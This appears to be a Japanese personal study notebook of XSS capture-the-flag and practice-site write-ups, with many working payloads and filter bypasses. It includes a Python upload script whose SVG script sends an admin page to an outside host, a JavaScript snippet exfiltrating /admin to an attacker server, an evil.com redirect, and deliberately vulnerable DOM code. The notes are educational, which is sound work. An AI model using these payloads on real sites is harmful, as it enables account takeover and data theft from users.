<!DOCTYPE html>
<html>
<body>
    <a href="http://">x<x&lt;x data-spy=scroll data-target=&lt;img/src/onerror=alert(document.domain)&gt; zz</a>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.slim.min.js"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
</html>
```
adminのクローラに以下のURLを提出する。  
```txt
[svg](http://uploads.web-shop.ctfz.one/10f02271-2aaf-47e7-82c8-60941bb11fa0/093c690b-ba19-4705-b299-38c8286fc8d6.svg)
```
## SVG image XSS (CONFidence CTF 2019)
https://balsn.tw/ctf_writeup/20190317-confidencectf/#solution-1:-xss-in-svg-image  
- **entrypoint**   
nginx + Flask（Python）+ CloudFlareがバックエンドで動いている。  
プロフィールページでアバターとして画像ファイルがアップロードできるので、SVGイメージの中にXSSを仕込む。  
- **Payload**   
アバターの画像は100x100のサイズでないといけないので、`<image id="image0" width="100" height="100" x="0" y="0" href="" />`でサイズを指定する。  
```python
#!/usr/bin/env python3
import requests, glob
import secrets
s = requests.session()
r = s.post('http://web50.zajebistyc.tf/login', data=dict(login='laiph6Ieroh4iema',password='laiph6Ieroh4iema'))
filename = secrets.token_urlsafe(16) + '.html'
payload = '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">  
   <script>
      fetch("http://web50.zajebistyc.tf/profile/admin").then(r => r.text()).then(t => fetch("//example.com/"+btoa(t)));
   </script>
<image id="image0" width="100" height="100" x="0" y="0"
    href="" />
</svg>
'''
files = {
    'avatar': (filename, payload)
}
r = s.post('http://web50.zajebistyc.tf/profile/laiph6Ieroh4iema', files=files)
if 'not a valid image' in r.text[:150]:
    print(r.text)
if 'sorry, we only accept 100x100 images' in r.text[:150]:
    print(r.text)
url = 'http://web50.zajebistyc.tf/avatar/62eee5152305547ff387eef08af028d340611ce15db259aeb714f6518328885b/'+filename
print(url)
r = s.get(url)
print(r.headers['Content-Type'])

# p4{15_1t_1m4g3_or_n0t?}
```
## jpg file upload / cSP 'self' bypass (TJCTF 2018 - Stupid Blog)
https://graneed.hatenablog.com/entry/2018/08/13/103000  
- **entrypoint**   
プロフィール画像をアップロードできる機能がある。adminにUserを報告する機能があり、AdminのクローラがそのUserのプロフィールページを巡回してくれるので、プロフィールページにXSSするとわかる。  
CSPは`Content-Security-Policy: default-src 'self'`なので`<script>`はサニタイジングがないので挿入できるが実行はできない。  
プロフィール画像のURLは`https://stupid_blog.tjctf.org/<Username>/pfp`となっており拡張子が含まれないため、`Content-Type: application/octet-stream`でscriptファイルとして読み込めるらしい。  
https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs  
ここで紹介されているJavaScriptが挿入されたJPGファイルをアップロードして`<script charset="ISO-8859-1" src="/<Username>/pfp"></script>`で読み込むと無事JavaScriptが実行できる！  
`/admin`にアクセスするようなJavaScriptをXHRで実行させて読み込んだデータを攻撃者サーバーに送信させればOK  
- **Payload**   
https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs  
に挿入されたJavaScriptを以下に変更する。  
```js
xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET","/admin",false);
xmlhttp.send();
r=xmlhttp.responseText;
location.href='http://myserver/?q='+btoa(r);
```
## 
- **entrypoint**   
- **概要**   
- **Payload**   

## 
- **entrypoint**   
- **概要**   
- **Payload**   

## CSS Injection / Self Injection / Header Injection / Command Injection (Google CTF Cat Chat)
https://terjanq.github.io/google-ctf-writeups/   
- **entrypoint**   
ムズそう…  
- **概要**   
- **Payload**   
## bypass XSS Auditor (ISITDTU CTF 2019 Quals Writeup - XSSgame1)
https://graneed.hatenablog.com/entry/2019/06/30/224928   
- **entrypoint**   
もうXSS Auditorは廃止されてるから…   
- **概要**   
- **Payload**   

## CSS Injection (TSG CTF BADNONCE Part 1)
https://hackmd.io/@sekai/rk-iwwpo4?type=view  
- **entrypoint**   
- **概要**   
- **Payload**   
## XSS-unsafe jQuery plugins (GitHub Security Lab CTF 3:)
https://paraschetal.in/write-up/2020/01/28/github-security-lab-ctf.html   
- **entrypoint**   
まだ読んでない。  
- **概要**   
- **Payload**   
## 
- **entrypoint**   
- **概要**   
- **Payload**   

# Docker環境があるやつ
## somen (SECCON beginners 2020)
https://github.com/SECCON/Beginners_CTF_2020  
# 練習
## xsssample
http://bogus.jp/xsssample/   
writeupは以下   
https://qiita.com/gky360/items/175b8f1b4ca6f71644f4   
### 1 (normal)
http://bogus.jp/xsssample/xsssample_01.php   
![image](https://user-images.githubusercontent.com/56021519/103071017-289c1d80-4606-11eb-86d4-a051e0fdd02c.png)   
普通に`<script>alert(1);</script>`   
### 2 (bypass <input )
http://bogus.jp/xsssample/xsssample_02_M9eec.php   
![image](https://user-images.githubusercontent.com/56021519/103071081-436e9200-4606-11eb-8619-31160c8b6b82.png)   
以下のようにvalueの中に入力がセットされる。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="aaa"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
`a"><script>alert(1);</script>`

### 3 (bypass maxlength="10")
http://bogus.jp/xsssample/xsssample_03_J4Skr.php   
![image](https://user-images.githubusercontent.com/56021519/103071232-8d577800-4606-11eb-89c7-fff87f8644bc.png)   
以下のように10文字以内の制限がある。   
```txt
<form method="get" action="">login<br>
username<input name="user" maxlength="10" type="text" value=""><br>
password<input name="pass" maxlength="10" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
ブラウザからの入力が制限されているだけなので、URL上のGETパラメータの部分に`a"><script>alert(1);</script>`を書く。   
```txt
http://bogus.jp/xsssample/xsssample_03_J4Skr.php?user=a%22%3E%3Cscript%3Ealert(xss);%3C/script%3E&pass=
```
### 4 (bypass "<>")
http://bogus.jp/xsssample/xsssample_04_C_HD-.php   
![image](https://user-images.githubusercontent.com/56021519/103071499-0bb41a00-4607-11eb-8816-c28c47af61d9.png)   
`a"><script>alert(1);</script>`を入れると以下のようなる。どうやら`<>`が使えない。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="a"&gt;&lt;script&gt;alert(1);&lt;/script&gt;"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
以下でBypass。   
```txt
" onclick="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;
" onclick="window.onerror=eval;throw'=alert\x28\x22XSS\x22\x29';
" onclick="alert(xss);
```
### 5 (bypass maxlength="10" with POST)
http://bogus.jp/xsssample/xsssample_05_3S7LA.php   
![image](https://user-images.githubusercontent.com/56021519/103071643-5d5ca480-4607-11eb-96ca-13ad9bceb4b4.png)   
10文字以内の制限があるがPOSTしてるのでBurpで書き換える。   
```txt
word=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
```
### 6 (href javascript:)
http://bogus.jp/xsssample/xsssample_06_w6k2v.php   
![image](https://user-images.githubusercontent.com/56021519/103071770-a1e84000-4607-11eb-9926-f8bd7738a304.png)   
以下のように`href`属性の値に入力が入る。   
```txt
<h1><a href="aaa">link</a></h1>
```
以下でいける。   
```txt
javascript:alert('XSS!');
```
### 7 (filter "script")
http://bogus.jp/xsssample/xsssample_07_qqoXM.php   
![image](https://user-images.githubusercontent.com/56021519/103071857-d956ec80-4607-11eb-8e67-b40d9bd48ff0.png)   
<script></script>が弾かれてる   
大文字でもダメそう   
以下のように`<img`タグならいけた   
```txt
<img src="" onerror="alert('XSS!');">
```
### 8 (inject in document.write(''))
http://bogus.jp/xsssample/xsssample_08_sv8ec.php   
![image](https://user-images.githubusercontent.com/56021519/103071941-099e8b00-4608-11eb-9383-bf6b3c8c0525.png)   
以下のように入力がここに入る。なお、`"<>`は使えない。   
```txt
<script>
function hello(){
document.write ('aaa'+"さん");
}
</script>
```
以下でいける。   
```txt
');alert(xss);//
```
### 11 (inject \<input value="">)
文字数制限あり？   
`xsssample_11.php?user=aaa&pass="+onclick%3D"alert('xss')`で成功。   
### 12 (\<meta content=""/>)
`<>`が使えない   
この中に入力が入っている。   
```txt
<meta property="og:title" content="aaaa" />
```
https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308   
https://jpcertcc.github.io/OWASPdocuments/CheatSheets/XSSFilterEvasion.html   
https://stackoverflow.com/questions/18947139/xss-in-meta-tag   
ここにMETAタグを使ってXSSする方法がいろいろあるが、どれもうまく行ってない…ブラウザに依存してる？？   
以下のOpenRedirectだけは動作してる！
```txt
// 以下を送信
0;http://evil.com"HTTP-EQUIV="refresh"

<meta property="og:title" content="0;http://evil.com"HTTP-EQUIV="refresh"" />
```
### 13 (IE only)
### 14 (filter ?)
いろいろ試した結果`<SCRIPT>`と大文字にすればなんらかのフィルタリングをバイパスできてる！   
```txt
<scrscriptipt>
	<scr
<scr<script>ipt>
	<scr<
<<script>ipt>
	<<
<scri<pt>ipt>
	<scri
<script<pt>ipt>
	<
<scrip<pt>ipt>
	<scrip
<SCRIPT>
	<SCRIPT>
<script>
	<script>
<script>alert(1)
	<
<script>a
	<
<SCRIPT>a
	<SCRIPT>a
<SCRIPT>alert(1)
	<SCRIPT>alert(1)
<SCRIPT>alert(1)</SCRIPT>
```
### 15 (???)
おそらく`#`以降をなんやかんやするDOM based？でもJSが特にないのでPHPでなんかやってそう…   

## XSS Challenges
https://blogs.tunelko.com/2013/12/02/xss-challenges/   
writupはここ   
### 1 (normal)
![image](https://user-images.githubusercontent.com/56021519/103072436-ea542d80-4608-11eb-94f9-09f21674c770.png)   
`<script>alert(document.domain);</script>`   
### 2 (bypass \<input value="">)
![image](https://user-images.githubusercontent.com/56021519/103072526-11aafa80-4609-11eb-84c1-5aa2f0c6dd17.png)   
`"><script>alert(document.domain);</script>`   
### 3 (inject \<select>tag)
![image](https://user-images.githubusercontent.com/56021519/103072736-8120ea00-4609-11eb-80af-8680a479fc56.png)   
`"><script>alert(document.domain);</script>`をselect countryにいれてもいけるらしい   
POSTを書き換える。   
```txt
p1=a&p2=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
![image](https://user-images.githubusercontent.com/56021519/103072714-7403fb00-4609-11eb-8e86-d7cba0dddb0e.png)   

### 4 (bypas \<input type="hidden" value="">)
![image](https://user-images.githubusercontent.com/56021519/103072902-e2e15400-4609-11eb-8d2e-27f8f22a8bef.png)   
hackmeというパラメータが送信されている。   
```txt
p1=aaa&p2=Japan&p3=hackme
```
`"><script>alert(document.domain);</script>`をhackmeの後に着けると成功！   
```txt
p1=a&p2=Japan&p3=hackme%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
```txt
</select>
<input type="hidden" name="p3" value="hackme">
<script>alert(document.domain);</script>
">
<hr class=red>
```
### 5 (bypass maxlength="15")
![image](https://user-images.githubusercontent.com/56021519/103073265-af52f980-460a-11eb-918b-b241b0f53785.png)   
以下を送信してみる。   
```txt
p1=aaa%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
以下が返る。`maxlength="15"`に設定されているのでBurpから編集する。   
```txt
<form action="?sid=950789ec9535788b7bc7651d8b31bd7b63c3ecb9" method="post">
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" 
maxlength="15" size="30" value="aaa<script>alert(document.domain);</script>"> 
<input type="submit" value="Search">
```
さっきと同じで成功！   
```txt
p1=aaa%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
### 6 (fileter "<>")
![image](https://user-images.githubusercontent.com/56021519/103073664-56379580-460b-11eb-8659-4a5f39796123.png)   
以下を送信する。   
```txt
p1=aaa%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
以下が返るので、`<>`がエスケープされてる。   
```txt
<form action="?sid=222f0be5885c36dac3576a0821f5c018691232fa" method="post">
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" 
size="50" value="aaa&lt;script&gt;alert(document.domain);&lt;/script&gt;"> <input 
type="submit" value="Search">
```
以下で成功！   
```txt
" onclick="alert(document.domain);
```
### 7 (inject \<input value= > with no quote)
![image](https://user-images.githubusercontent.com/56021519/103073917-d231dd80-460b-11eb-9dd9-76c646bfc5af.png)   
さっきと同じやつを送信してみる。   
```txt
p1=%22+onclick%3D%22alert%28document.domain%29%3B
```
`"`,`'`が使えない。   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=&quot; onclick=&quot;alert(document.domain);> <input type="submit" value="Search">
```
よく見ると`value=aaaa`となっていて`"`がない。   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=aaaaaa> <input type="submit" value="Search">
```
`hogehoge onmouseover=alert(document.domain)`のようにスペースを入れると普通に成功！   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=hogehoge onmouseover=alert(document.domain)> <input type="submit" value="Search">
```
### 8 (href)
![image](https://user-images.githubusercontent.com/56021519/103074774-a3b50200-460d-11eb-9be0-0634932f4d3d.png)   
以下のようになる。   
```txt
<hr class=red>URL: <a href="aaaa">aaaa</a><hr class=red>
```
`javascript:alert(document.domain);`で成功！   
### 9 (UTF-7 XSS)
![image](https://user-images.githubusercontent.com/56021519/103074929-f2629c00-460d-11eb-8b0a-8b8bf88063dd.png)   

```txt
p1=aaaaa&charset=euc-jpbbbbbb
```
```txt
Content-Type: text/html; charset=euc-jpbbbbbb
Content-Length: 1817

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jpbbbbbb">
  
// 省略
<input type="text" name="p1" size="50" value="aaaaa">
```
`"><script>alert(document.domain);</script>`をそれぞれに送信してみると`"`がエスケープされてるぽい。   
```txt
Content-Type: text/html; charset=euc-jp&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
Content-Length: 1934

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jp&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;">
  <script language="JavaScript" type="text/javascript" charset="euc-jp" src="script.js">
```
以下のように改行をいれたHTTP Header Injectionを試す。   
```txt
aaa

<script>alert(document.domain);</script>
```
ダメっぽい…   
```txt
Content-Type: text/html; charset=UTF-8
Content-Length: 1868

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jpaaa

&lt;script&gt;alert(document.domain);&lt;/script&gt;">
```
IEではcontent-typeが明示されてないと、UTF-7で書かれてると判断してXSSが可能らしい。   
UTF-7のXSSができるらしいがなんかうまく行ってない…   
```txt
p1=ffff%2BACI-+onmouseover%3D%2BACI-alert%28document.domain%29&charset=euc-jpffff%2BACI-+onmouseover%3D%2BACI-alert%28document.domain%29
```
これでIEでは`value="ffff" onmouseover="alert(document.domain)">`となっていけるはずだがなんかうまく行ってない   
IEのバージョンか？   
writeupでもうまく行かなかったって言ってる。   
```txt
Content-Type: text/html; charset=euc-jpffff+ACI- onmouseover=+ACI-alert(document.domain)

<input type="text" name="p1" size="50" value="ffff+ACI- onmouseover=+ACI-alert(document.domain)">
```
### 10 (filter "domain")
![image](https://user-images.githubusercontent.com/56021519/103078634-a7e51d80-4615-11eb-8338-6714f148dacc.png)   
さっきと同じ`"><script>alert(document.domain);</script>`を送信すると`domain`という文字がフィルタリングされている。   
```txt
No results for your Query. Try again: 
<input type="text" name="p1" size="50" value="bbb">
<script>alert(document.);</script>
"> 
```
以下で文字列を生成して、`"><script>eval(`${String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)}`)</script>`で`eval("alert(document.domain)")`と同じことをすると成功！   
```python
S = """alert(document.domain)"""

C = []
for s in S:
    C.append(ord(s))

print("${" + "String.fromCharCode({})".format(",".join(list(map(str, C)))) + "}")
# ${String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)}
```
そもそも`"><script>alert(document.domdomainain);</script>`でいけたは…   
ちなみに、`” onmouseover=alert(document.domdomainain); x=”`でマウスをinpuの中にセットすれば行けるはずだけどなんかうまく行ってない…   
![image](https://user-images.githubusercontent.com/56021519/103080190-abc66f00-4618-11eb-9472-12257140c6eb.png)   
### 11 ページが動いてない…
### 12 IE
### 13 IE
### 14 IE
### 15 (DOM based document.write)
![image](https://user-images.githubusercontent.com/56021519/103081721-d9f97e00-461b-11eb-8b77-e1cac3afe6b7.png)   
`");alert(xss);//`を入力すると`"`がエスケープされてる…      
```txt
<script>document.write("&quot;);alert(xss);//");</script>
```
DOM basedでなければ`"`をBypassする方法はない(?)が、今回はDOM basedで`document.write()`の中に入力が入るので、`\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e`を入力すると一見できなそうだけどXSSできる！   
これは`<script>alert(document.domain)</script>`と同じ！   
```txt
<script>
document.write("\x3cscript\x3ealert(document.domain);\x3c/script\x3e");
</script>
```
https://macchinetta.github.io/server-guideline/current/ja/Security/XSS.html   
詳細はここにある。   
### 16 ページが動いてない

### 17 IE
### 18 IE
### 19 ページが動いてない

## DomGoat
### 1 (location.hash -> .innerHTML)
`https://domgo.at/cxss/example/1?payload=abcd&sp=x#%3Cimg%20src=/%20onerror=alert(1)%3E`でXSS成功！  
**Vunlerable code**  
```html
    let hash = location.hash;
    if (hash.length > 1) {
        let hashValueToUse = unescape(hash.substr(1));
        let msg = "Welcome <b>" + hashValueToUse + "</b>!!";
        document.getElementById("msgboard").innerHTML = msg;
    }
```
### 2 (document.referer -> .innerHTML)
`https://domgo.at/cxss/example/1?payload=%3Csvg/onload=alert(1)%3E&sp=x#12345`でExcercise１にアクセスした後に２にアクセスする。  
ページを遷移しないとだめ。Excercise２上でリロードしたもののRefererヘッダーをBurpで書き換えても`document.referer`は上書きできずダメだった。開発者ツールのConsoleで`document.referer`を上書きしてもダメだった。  
**Vunlerable code**  
```html
    let rfr = document.referrer;
    let paramValue = unescape(getPayloadParamValueFromUrl(rfr));
    if (paramValue.length > 0) {
        let msg = "Welcome <b>" + paramValue + "</b>!!";
        document.getElementById("msgboard").innerHTML = msg;
    } else {
        document.getElementById("msgboard").innerHTML = "Parameter named <b>payload</b> was not found in the referrer.";
    }
```
### 3 (XHR JSON -> .innerHTML)
`<img src=/ onerror=alert(1)>`を入力すると`https://domgo.at/data.json?payload=<img src=/ onerror=alert(1)>`をXHRで送信して`payload	"<img src=/ onerror=alert(1)>"`というJSONが返ってくる。  
**Vunlerable code**  
```html
    let processPayload = function () {

        let payload = document.getElementById('payloadbox').value;

        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
            if (this.readyState === 4 && this.status === 200) {
                if (debuggerEnabled) {
                    debugger;
                }
                let responseBody = xhr.responseText;
                let responeBodyObject = JSON.parse(responseBody);
                let msg = "Welcome <b>" + responeBodyObject.payload + "</b>!!";
                document.getElementById("msgboard").innerHTML = msg;

                //Data flow info
                document.getElementById("srcvalue").textContent = responeBodyObject.payload;
                document.getElementById("valuetosink").textContent = msg;
                document.getElementById("fullMsg").textContent = JSON.stringify(responeBodyObject, null, "\t");
            }
        };
        xhr.open("GET", '/data.json?payload=' + escape(payload), true);
        xhr.send();
    };

    processPayload();
```
### 4 (WebSocket JSON -> .innerHTML)
`<img src=/ onerror=alert(1)>`  
今度はXHRじゃなくてWebSocketを使用して入力に応じて`{  "payload": "aaaaaa"}`のようなJSONを返す。  
![image](https://user-images.githubusercontent.com/56021519/103761496-1d131280-505a-11eb-801d-314340366727.png)  

**Vunlerable code**  
```html
    let webSocketUrl = (location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws";
    document.getElementById("wsUrl").textContent = webSocketUrl;

    let showFullResponse = function (btn) {
        $("#msgModal").modal();
        return false;
    };

    let debuggerEnabled = false;
    let toggleDebugging = function () {
        debuggerEnabled = !debuggerEnabled;
        if (debuggerEnabled) {
            document.getElementById("debugToglrBtn").className = "text-muted";
        } else {
            document.getElementById("debugToglrBtn").className = "text-danger";
        }
    };

    let ws = new WebSocket(webSocketUrl);
    ws.onmessage = function (evt) {
        if (debuggerEnabled) {
            debugger;
        }
        try {
            let rawMsg = evt.data;
            let msgJson = JSON.parse(rawMsg);
            let msg = "Welcome <b>" + msgJson.payload + "</b>!!";
            document.getElementById("msgboard").innerHTML = msg;

            //Data flow info
            document.getElementById("srcvalue").textContent = msgJson.payload;
            document.getElementById("valuetosink").textContent = msg;
            document.getElementById("fullMsg").textContent = JSON.stringify(msgJson, null, "\t");
        } catch (e) {
            console.log(e);
        }
    };

    ws.onopen = function () {
        processPayload();
        
    };


    let processPayload = function () {

        let payload = document.getElementById('payloadbox').value;
        ws.send(payload);
    };
```
### 5 (frames[0].postMessage -> window.parent.postMessage -> .innerHTML)
`<img src=/ onerror=alert(1)>`を同様に入力する。  
**Vunlerable code**  
`/cxss/example/5`  
iframeで`/cxss/iframe`のHTMLを読みこむ。  
`frames[0].postMessage(payload, location.origin);`でwindow.framesの1つ目のWindowsオブジェクト`Window https://domgo.at/cxss/iframe`に`postMessage`でデータ`payload`を送信する。`location.origin`は`"https://domgo.at"`をさしている。  
`postMessage`はWindow間でデータを送信、受信できる。以下の`window.onmessage = function (evt) {`で`addEventListener('message', function(event) {`と同じようにデータを受信する。`evt.data`でデータを取り出せる。  
```html
    <iframe src="/cxss/iframe" style="display:none"></iframe>
</div>
<script>

    document.getElementById("wmUrl").textContent = location.origin;

    let showFullResponse = function (btn) {
        $("#msgModal").modal();
        return false;
    };

    let debuggerEnabled = false;
    let toggleDebugging = function () {
        debuggerEnabled = !debuggerEnabled;
        if (debuggerEnabled) {
            document.getElementById("debugToglrBtn").className = "text-muted";
        } else {
            document.getElementById("debugToglrBtn").className = "text-danger";
        }
    };

    window.onmessage = function (evt) {
        if (debuggerEnabled) {
            debugger;
        }

        try {

            let msgObj = evt.data;
            let msg = "Welcome <b>" + msgObj.payload + "</b>!!";
            document.getElementById("msgboard").innerHTML = msg;

            //Data flow info
            document.getElementById("srcvalue").textContent = msgObj.payload;
            document.getElementById("valuetosink").textContent = msg;
            document.getElementById("fullMsg").textContent = JSON.stringify(msgObj, null, "\t");

        } catch (e) {
            console.log(e);
        }
    };

    window.onload = function () {
        processPayload();
    };

    let processPayload = function () {

        let payload = document.getElementById('payloadbox').value;
        frames[0].postMessage(payload, location.origin);
    };

</script>
```
`/cxss/iframe`  
`frames[0].postMessage(payload, location.origin);`から送信されてきた値を`{"payload": evt.data}`としてJSON形式に加工して、親Windowに`postMessage`で送信し返している。  
```html
<html>
<body>
    <script>
        window.onmessage = function (evt) {
            var msg = evt.data;
            //console.log(evt);
            window.parent.postMessage({
                "payload": msg
            },
                location.origin);
        };
    </script>
</body>
</html>
```
### 6 (localStorage.setItem() -> localStorage.getItem() -> .innerHTML)
`<img src=/ onerror=alert(1)>`  
**Vunlerable code**  
localStorageを使ってデータを保存している。  
![image](https://user-images.githubusercontent.com/56021519/103765718-ff957700-5060-11eb-8492-3607eaa6a9ab.png)  
`localStorage.setItem("payload", payload);`でデータをlocalStorageに保存して、`let payloadValue = localStorage.getItem("payload");`でデータを取り出している。  
```html
<script>

    let debuggerEnabled = false;
    let toggleDebugging = function () {
        debuggerEnabled = !debuggerEnabled;
        if (debuggerEnabled) {
            document.getElementById("debugToglrBtn").className = "text-muted";
        } else {
            document.getElementById("debugToglrBtn").className = "text-danger";
        }
    };

    window.onload = function () {
        processPayload();
    };

    let processPayload = function () {
        let payload = document.getElementById('payloadbox').value;
        localStorage.setItem("payload", payload);
        readPayload();
    };

    let readPayload = function () {

        if (debuggerEnabled) {
            debugger;
        }

        let payloadValue = localStorage.getItem("payload");
        let msg = "Welcome <b>" + payloadValue + "</b>!!";
        document.getElementById("msgboard").innerHTML = msg;

        //Data flow info
        document.getElementById("srcvalue").textContent = payloadValue;
        document.getElementById("valuetosink").textContent = msg;
    };

</script>
```
### 7 (inject href in <a tag with onmouseover=alert(1))
`<`,`>`が`replace`でエスケープされてる。`aaa`を入力すると、`<a href='#user=aaa'>Welcome</a>!! `が出力される。  
`>`で閉じることはできないけど、`onmouseover`とかでインラインスクリプトを入れればOK   
`<a href='#user=a' onmouseover='javascript:alert(1);'>Welcome</a>!! `  
**Vunlerable code**  
```html
    let hash = location.hash;
    let hashValueToUse = hash.length > 1 ? unescape(hash.substr(1)) : hash;
    hashValueToUse = hashValueToUse.replace(/</g, "&lt;").replace(/>/g, "&gt;");
    let msg = "<a href='#user=" + hashValueToUse + "'>Welcome</a>!!";
    document.getElementById("msgboard").innerHTML = msg;

    //Data flow info
    document.getElementById("srcvalue").textContent = hash;
    document.getElementById("valuetosink").textContent = msg;
```
### 8 (inject href in <a tag with onmouseover=alert(1))
`.substr(hashValueToUse.indexOf("=")+1)`で`user=1234`をはじめに`=`が現れたindex`4`に1を足した`5`を`.substr()`して5文字目以降の`1234`を抽出する。  
7と同様、`12345' onmouseover='alert(1)`で、`<a href='#user=12345' onmouseover='alert(1)'>Welcome</a>!!`となって成功！  
**Vunlerable code**  
```html
    let hash = location.hash;
    let hashValueToUse = hash.length > 1 ? unescape(hash.substr(1)) : hash;

    if (hashValueToUse.indexOf("=") > -1 ) {
        hashValueToUse = hashValueToUse.substr(hashValueToUse.indexOf("=")+1);
        hashValueToUse = hashValueToUse.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        let msg = "<a href='#user=" + hashValueToUse + "'>Welcome</a>!!";
        document.getElementById("msgboard").innerHTML = msg;

        //Data flow info
        document.getElementById("srcvalue").textContent = hash;
        document.getElementById("valuetosink").textContent = msg;
    }
```
### 9 (javascript:alert(1) in \<a tag href="\<inject>")
今度は`"`が弾かれてしまう。  
`href="<inject>"`なので`javascript:alert(1)`でよい。  
`window.name = ":alert(1)"`として`/cxss/example/9#user=javascript`でよい。  
**Vunlerable code**  
```html
    let hash = location.hash;
    let hashValueToUse = hash.length > 1 ? unescape(hash.substr(1)) : hash;

    if (hashValueToUse.indexOf("=") > -1 ) {
        
        hashValueToUse = hashValueToUse.substr(hashValueToUse.indexOf("=") + 1);
        
        if (hashValueToUse.length > 1) {
            hashValueToUse = hashValueToUse.substr(0, 10);
            hashValueToUse = hashValueToUse.replace(/"/g, "&quot;");
            let windowValueToUse = window.name.replace(/"/g, "&quot;");
            let msg = "<a href=\"" + hashValueToUse + windowValueToUse + "\">Welcome</a>!!";
            document.getElementById("msgboard").innerHTML = msg;
        }
    }
```
### 10 (javascript:alert(1) in \<a tag href="\<inject>")
9と同じ感じで`/cxss/example/10?lang=en&user=ID-javascript&returnurl=/`で`javascript`を取り出して、`window.name`と結合する。`window.name=":alert(1)"`とすればよい。  
**Vunlerable code**  
```html
    let urlParts = location.href.split("?");
    if (urlParts.length > 1) {
        
        let queryString = urlParts[1];
        let queryParts = queryString.split("&");
        let userId = "";
        for (let i = 0; i < queryParts.length; i++) {
            
            let keyVal = queryParts[i].split("=");
            if (keyVal.length > 1) {
                if (keyVal[0] === "user") {
                    
                    userId = keyVal[1];
                    break;
                }
            }
        }
        if (userId.startsWith("ID-")) {

            userId = userId.substr(3, 10);
            userId = userId.replace(/"/g, "&quot;");
            let windowValueToUse = window.name.replace(/"/g, "&quot;");
            let msg = "<a href=\"" + userId + windowValueToUse + "\">Welcome</a>!!";
            document.getElementById("msgboard").innerHTML = msg;
        }
    }
```

## 動作環境ナシ
### XSS Challenge(セキュリティ・ミニキャンプ in 岡山 2018)
https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3   
https://graneed.hatenablog.com/entry/2018/11/23/222842   
### katagaitaiCTF#9 xss千本ノック
http://sec-rookie.hatenablog.com/entry/2017/08/29/015957   
https://exploit.moe/2017-08-28/katagaitaiCTF9-writeup   

# メモ
http://www.thespanner.co.uk/2012/05/08/eval-a-url/  
`eval(url)`としてurlの形態を保ったままでJSを実行できるらしい  
https://renaudmarti.net/posts/intigriti-xss-challenge/  
動作環境ないと理解するの難しそう…  
https://jsbin.com/?html  
html,css,JavaScript,Consoleを自由に実行できるようなサイト。XSSの検証によさそう！  
https://www.hamayanhamayan.com/entry/2020/06/27/191504  
.innerHTMLのサニタイジングをバイパスするテク  




